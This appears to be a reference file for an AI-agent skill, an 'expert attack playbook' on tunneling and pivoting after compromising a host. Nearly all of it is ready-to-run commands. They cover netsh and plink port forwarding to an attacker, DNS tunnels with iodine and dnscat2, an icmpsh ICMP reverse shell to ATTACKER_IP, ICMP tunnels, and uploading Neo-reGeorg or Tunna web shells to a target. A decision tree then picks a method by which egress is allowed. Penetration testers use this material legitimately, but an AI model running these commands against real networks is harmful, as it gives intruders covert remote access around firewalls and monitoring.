# SKILL: Tunneling & Pivoting — Expert Attack Playbook: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [6. WINDOWS PIVOTING](#6-windows-pivoting)
- [7. DNS TUNNELING](#7-dns-tunneling)
- [8. ICMP TUNNELING](#8-icmp-tunneling)
- [9. HTTP TUNNELING](#9-http-tunneling)
- [10. PIVOTING DECISION MATRIX](#10-pivoting-decision-matrix)
- [11. DECISION TREE](#11-decision-tree)
<!-- zhiyugo:toc:end -->

## 6. WINDOWS PIVOTING

### Netsh Port Forwarding

```cmd
:: Forward port (requires admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=INTERNAL_IP

:: List forwards
netsh interface portproxy show all

:: Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Plink (PuTTY CLI)

```cmd
:: Dynamic SOCKS (like ssh -D)
plink.exe -ssh -D 1080 -N user@ATTACKER

:: Remote port forward
plink.exe -ssh -R 4444:127.0.0.1:4444 user@ATTACKER

:: Automated (non-interactive, accept host key)
echo y | plink.exe -ssh -l user -pw password -R 9050:127.0.0.1:9050 ATTACKER
```

---

## 7. DNS TUNNELING

```bash
# iodine — IP-over-DNS
# Server (attacker, with NS record pointing to attacker):
iodined -f -c -P password 10.0.0.1 t1.yourdomain.com

# Client (victim):
iodine -f -P password t1.yourdomain.com
# Creates dns0 interface → route traffic through it

# dnscat2 — command channel over DNS
# Server:
ruby dnscat2.rb yourdomain.com
# Client:
./dnscat --dns=server=ATTACKER,port=53 --secret=SHARED_SECRET
```

---

## 8. ICMP TUNNELING

```bash
# icmpsh — ICMP reverse shell (no raw socket on victim needed for Windows)
# Attacker:
sysctl -w net.ipv4.icmp_echo_ignore_all=1
python3 icmpsh_m.py ATTACKER_IP VICTIM_IP

# Victim (Windows):
icmpsh.exe -t ATTACKER_IP

# ptunnel-ng — TCP-over-ICMP
# Server:
ptunnel-ng -r INTERNAL_HOST -R 22
# Client:
ptunnel-ng -p PIVOT_IP -l 2222 -r INTERNAL_HOST -R 22
ssh -p 2222 user@127.0.0.1
```

---

## 9. HTTP TUNNELING

```bash
# Neo-reGeorg — SOCKS proxy via web shell
# Generate tunnel web shell:
python3 neoreg.py generate -k PASSWORD

# Upload tunnel.php/aspx/jsp to target web server

# Connect:
python3 neoreg.py -k PASSWORD -u http://TARGET/tunnel.php
# SOCKS proxy on 127.0.0.1:1080

# Tunna — HTTP tunnel (alternative)
python2 proxy.py -u http://TARGET/conn.php -l 4444 -r 3389 -a INTERNAL_IP
```

---

## 10. PIVOTING DECISION MATRIX

| Egress Allowed | Tool | Notes |
|---|---|---|
| TCP outbound (any port) | Chisel, Ligolo-ng, SSH | Fastest setup |
| TCP 80/443 only | Chisel (HTTP/S), Neo-reGeorg | Blend with web traffic |
| DNS only (53/udp) | iodine, dnscat2 | Slow but stealthy |
| ICMP only | ptunnel-ng, icmpsh | Very restricted environments |
| No outbound | Bind shell + port forward in | Needs inbound access to pivot |
| Web shell only | Neo-reGeorg, Tunna | When only HTTP file upload works |

---

## 11. DECISION TREE

```
Compromised host — need to reach internal network
│
├── Can install tools on pivot?
│   ├── YES + outbound TCP allowed?
│   │   ├── Need transparent routing? → Ligolo-ng (§3)
│   │   ├── Need SOCKS proxy? → Chisel reverse SOCKS (§2)
│   │   └── SSH available? → SSH dynamic forward (§1)
│   │
│   ├── YES + only HTTP(S) outbound?
│   │   ├── Chisel over HTTPS (§2)
│   │   └── Upload web tunnel → Neo-reGeorg (§9)
│   │
│   ├── YES + only DNS outbound?
│   │   └── iodine or dnscat2 (§7)
│   │
│   └── YES + only ICMP allowed?
│       └── ptunnel-ng or icmpsh (§8)
│
├── Cannot install tools (web shell only)?
│   └── Neo-reGeorg / Tunna via web shell (§9)
│
├── Windows pivot?
│   ├── Admin access? → netsh portproxy (§6)
│   ├── SSH client available? → ssh.exe (Windows 10+) (§1)
│   └── Outbound SSH? → plink (§6)
│
├── Need multi-layer pivot?
│   ├── Ligolo-ng: multiple agents + route stacking (§3)
│   ├── SSH ProxyJump chaining (§1)
│   └── ProxyChains with multiple SOCKS (§5)
│
└── Teammate needs access too?
    ├── Bind SOCKS on 0.0.0.0 (ssh -L 0.0.0.0:...)
    └── Share Ligolo-ng routes via common proxy
```
